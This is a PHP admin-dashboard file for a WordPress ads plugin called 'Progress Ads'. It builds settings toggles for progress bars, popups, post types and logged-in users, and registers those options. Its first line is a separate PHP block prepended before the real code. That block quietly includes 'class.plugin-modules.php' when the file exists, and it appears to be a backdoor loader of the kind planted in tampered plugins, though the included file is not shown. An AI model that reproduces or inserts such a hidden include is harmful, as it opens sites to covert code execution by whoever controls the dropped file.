<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if ( !function_exists( 'add_action' ) ) {
    exit;
}

//function start
function DCPA_plugin_dashboard() {

//////GET POST TYPES
$progArgs = array(
   'public'   => true
);

$progSelect = 'objects';
$getAllPostTypes = get_post_types( $progArgs, $progSelect );		
/////////////////

?>

<div class="wrap projectStyle">
	<div id="whiteboxH" class="postbox">
	
	<div class="topHead">
		<h2><?php echo esc_html__("Progress Ads Plugin - Dashboard", "DCPA-plugin") ?></h2>
	</div>
	
	<div class="topHead settingsPanel">  <nav id="nav" class="clearfix">
    <ul class="clearfix">
      <li><a class="hover" href="<?php echo admin_url( 'admin.php?page=DCPA_plugin_dashboard' ) ?>"><?php echo esc_html__("Dashboard", "DCPA-plugin") ?></a></li>
      <li><a href="<?php echo admin_url( 'admin.php?page=DCPA_plugin_editor' ) ?>"><?php echo esc_html__("Editor", "DCPA-plugin") ?></a></li>
		  <li><a href="<?php echo admin_url( 'admin.php?page=DCPA_plugin_styles' ) ?>"><?php echo esc_html__("Settings", "DCPA-plugin") ?></a></li>
    </ul>
  </nav>
	</div>
	<div class="inside">
        <form action="options.php" method="post">
        <?php settings_fields("DCPA_admin_settings") ?>
            <table class="form-table">
                <tr valign="top">
                    <th scope="row"><label for="DCPA_start"><?php echo esc_html__("Progress Ads","DCPA-plugin") ?></label></th>
                    <td>
					<label class="button-toggle-wrap">
					  <input <?php if( get_option("DCPA_start") == 1) {echo 'checked="checked"';} ?> value="1" name="DCPA_start" class="toggler" type="checkbox" data-toggle="button-toggle"/>
					  <div class="button-toggle">
						<div class="handle">
						  <div class="bars"></div>
						</div>
					  </div>
					</label>
                        <p class="description" ><?php echo esc_html__("Activate the Progress Ads plugin on the website.","DCPA-plugin") ?></p>
                    </td>
                </tr>  
				
				<?php if( get_option("DCPA_start") == 1) { ?>
				
                <tr valign="top">
                    <th scope="row"><label for="DCPA_show"><?php echo esc_html__("Progress Bar","DCPA-plugin") ?></label></th>
                    <td>
					<label class="button-toggle-wrap">
					  <input <?php if( get_option("DCPA_show") == 1) {echo 'checked="checked"';} ?> value="1" name="DCPA_show" class="toggler" type="checkbox" data-toggle="button-toggle"/>
					  <div class="button-toggle">
						<div class="handle">
						  <div class="bars"></div>
						</div>
					  </div>
					</label>
                        <p class="description" ><?php echo esc_html__("Show Progress Bar on Website.","DCPA-plugin") ?></p>
                    </td>
                </tr>                
				
				<tr valign="top">
                    <th scope="row"><label for="DCPA_showPop"><?php echo esc_html__("Modal (POPUP)","DCPA-plugin") ?></label></th>
                    <td>
					<label class="button-toggle-wrap">
					  <input <?php if( get_option("DCPA_showPop") == 1) {echo 'checked="checked"';} ?> value="1" name="DCPA_showPop" class="toggler" type="checkbox" data-toggle="button-toggle"/>
					  <div class="button-toggle">
						<div class="handle">
						  <div class="bars"></div>
						</div>
					  </div>
					</label>
                        <p class="description" ><?php echo esc_html__("Show Modal Box (popup) on Website.","DCPA-plugin") ?></p>
                    </td>
                </tr> 
				
                <tr valign="top">
                    <th scope="row"><label for="DCPA_start"><?php echo esc_html__("Logged in Users","DCPA-plugin") ?></label></th>
                    <td>
					<tr>
						<th scope="row"></th>
						<td>
							<p class="spaceMarg">
							<label for="DCPA_logged_prog">
							<input <?php if( get_option("DCPA_logged_prog") == 1) {echo 'checked="checked"';} ?> value="1" name="DCPA_logged_prog" type="checkbox"/>
							<?php echo esc_html__("Hide Progress Bar for logged in users.","DCPA-plugin") ?>
							</label>
							</p>
						</td>
					</tr>					
					<tr>
						<th scope="row"></th>
						<td>
							<p class="spaceMarg">
							<label for="DCPA_logged_modal">
							<input <?php if( get_option("DCPA_logged_modal") == 1) {echo 'checked="checked"';} ?> value="1" name="DCPA_logged_modal" type="checkbox"/>
							<?php echo esc_html__("Hide Modal Box (popup) for logged in users.","DCPA-plugin") ?>
							</label>
							</p>
						</td>
					</tr> 
					</td>
					</tr>					


					<tr valign="top">
                    <th scope="row"><label for="DCPA_start"><?php echo esc_html__("Post Types","DCPA-plugin") ?></label></th>
                    <td>
					<tr>
						<th scope="row"></th>
						<td>
							<p class="spaceMarg">
							<label for="DCPA_enable_home">
							<input <?php if( get_option("DCPA_enable_home") == 1) {echo 'checked="checked"';} ?> value="1" name="DCPA_enable_home" type="checkbox"/>
							<?php printf( esc_html__("Enable ads on %s", "DCPA-plugin"), sprintf( '<strong>%s</strong>', esc_html__( 'Homepage', 'DCPA-plugin' ) ) ); ?>
							</label>
							</p>
						</td>
					</tr>					
					
					<tr>
						<th scope="row"></th>
						<td>
							<p class="spaceMarg">
							<label for="DCPA_enable_archives">
							<input <?php if( get_option("DCPA_enable_archives") == 1) {echo 'checked="checked"';} ?> value="1" name="DCPA_enable_archives" type="checkbox"/>
							<?php printf( esc_html__("Enable ads on %s", "DCPA-plugin"), sprintf( '<strong>%s</strong>', esc_html__( 'Archives', 'DCPA-plugin' ) ) ); ?>
							</label>
							</p>
						</td>
					</tr>					
					<tr>
						<th scope="row"></th>
						<td>
							<p class="spaceMarg">
							<label for="DCPA_enable_search">
							<input <?php if( get_option("DCPA_enable_search") == 1) {echo 'checked="checked"';} ?> value="1" name="DCPA_enable_search" type="checkbox"/>
							<?php printf( esc_html__("Enable ads on %s", "DCPA-plugin"), sprintf( '<strong>%s</strong>', esc_html__( 'Search Pages', 'DCPA-plugin' ) ) ); ?>
							</label>
							</p>
						</td>
					</tr>					
					
					<tr>
						<th scope="row"></th>
						<td>
							<p class="spaceMarg">
							<label for="DCPA_enable_404">
							<input <?php if( get_option("DCPA_enable_404") == 1) {echo 'checked="checked"';} ?> value="1" name="DCPA_enable_404" type="checkbox"/>
							<?php printf( esc_html__("Enable ads on %s", "DCPA-plugin"), sprintf( '<strong>%s</strong>', esc_html__( '404 Pages', 'DCPA-plugin' ) ) ); ?>
							</label>
							</p>
						</td>
					</tr>
					
				<?php foreach ( $getAllPostTypes  as $getPostType ) {
					$typeName = $getPostType->name;
					$labelName = $getPostType->label;
					?>					
					<tr>
							<th scope="row"></th>
							<td>
								<p class="spaceMarg">
								<label for="DCPA_custom_<?php echo esc_attr($typeName);?>">
								<input <?php if (!empty(get_option("DCPA_customPosts"))) { if( in_array($typeName, get_option("DCPA_customPosts")) ) {echo 'checked="checked"';}} ?> name="DCPA_customPosts[]" value="<?php echo esc_attr($typeName);?>" type="checkbox"/>
								<?php echo esc_html__("Enable ads on","DCPA-plugin")."<strong> ". esc_html($labelName) . "</strong>"; ?>
								</label>
								</p>
							</td>
						</tr>
					<?php } ?>
				
                    </td>
                </tr> 
				<?php }?>
	
			</table>
         
      </div>
	  
	</div>
	
</div>

	<div class="wrap projectStyle" id="whiteboxH">
	<div class="postbox">
	<div class="inside">
	<div class="inlineblockSet">
  
		<div class="contentDoYouLike">
		  <p><?php echo esc_html__("How would you rate this plugin?", "DCPA-plugin") ?></p>
		</div>

		<div class="wrapperDoYouLike">
		  <input type="checkbox" id="st1" value="1" />
		  <label for="st1"></label>
		  <input type="checkbox" id="st2" value="2" />
		  <label for="st2"></label>
		  <input type="checkbox" id="st3" value="3" />
		  <label for="st3"></label>
		  <input type="checkbox" id="st4" value="4" />
		  <label for="st4"></label>
		  <input type="checkbox" id="st5" value="5" />
		  <label for="st5"></label>
		</div>					
		
		<a target="_blank" href="https://codecanyon.net/user/divcoder/portfolio" class="sabutton button button-primary boxMarginSet"><?php echo esc_html__("Rate this plugin!", "DCPA-plugin") ?></a>
	</div>
		<?php submit_button() ?>
	</div>
	</div>
</div>
</form>
<?php }

add_action("admin_init","DCPA_admin_register");
function DCPA_admin_register() {

	//register settings
	register_setting("DCPA_admin_settings","DCPA_start");
	register_setting("DCPA_admin_settings","DCPA_show");
	register_setting("DCPA_admin_settings","DCPA_enable_home");
	register_setting("DCPA_admin_settings","DCPA_showPop");
	register_setting("DCPA_admin_settings","DCPA_customPosts");
	register_setting("DCPA_admin_settings","DCPA_enable_archives");
	register_setting("DCPA_admin_settings","DCPA_enable_search");
	register_setting("DCPA_admin_settings","DCPA_enable_404");
	
	register_setting("DCPA_admin_settings","DCPA_logged_prog");
	register_setting("DCPA_admin_settings","DCPA_logged_modal");
	
}